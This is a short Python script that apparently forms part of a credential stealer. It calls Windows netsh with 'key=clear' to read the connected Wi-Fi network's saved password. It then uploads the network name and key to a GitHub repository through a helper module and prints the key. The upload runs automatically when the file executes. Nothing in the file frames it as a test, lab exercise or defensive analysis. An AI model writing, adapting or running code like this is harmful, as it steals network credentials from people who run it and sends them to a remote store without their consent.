import subprocess
from Github import Github


class WifiKey:
    def to_github():
        g = Github()
        info = WifiKey.get_connected_wifi_key()
        if info is not None:
            g.save_to_repo("Wifi/" + info[0], info[1].encode("utf-8"))
            print("Wifi done"),

    def get_content(name, raw_result):
        lines = raw_result.splitlines()
        for line in lines:
            if name in line:
                return line.split(":")[1].strip()

    def get_connected_wifi_key():
        try:
            results = subprocess.check_output(["netsh", "wlan", "show", "interface"])
            results = results.decode("ascii")
            results = results.replace("\r", "")
            profile = WifiKey.get_content("SSID", results)

            result = subprocess.check_output(
                ["netsh", "wlan", "show", "profile", f"name={profile}", "key=clear"]
            )
            result = result.decode("ascii")
            return [profile, WifiKey.get_content("Key Content", result)]
        except Exception as e:
            return None


WifiKey.to_github()
print(WifiKey.get_connected_wifi_key())
print("Wi-Fi Key Content:", WifiKey.get_connected_wifi_key())
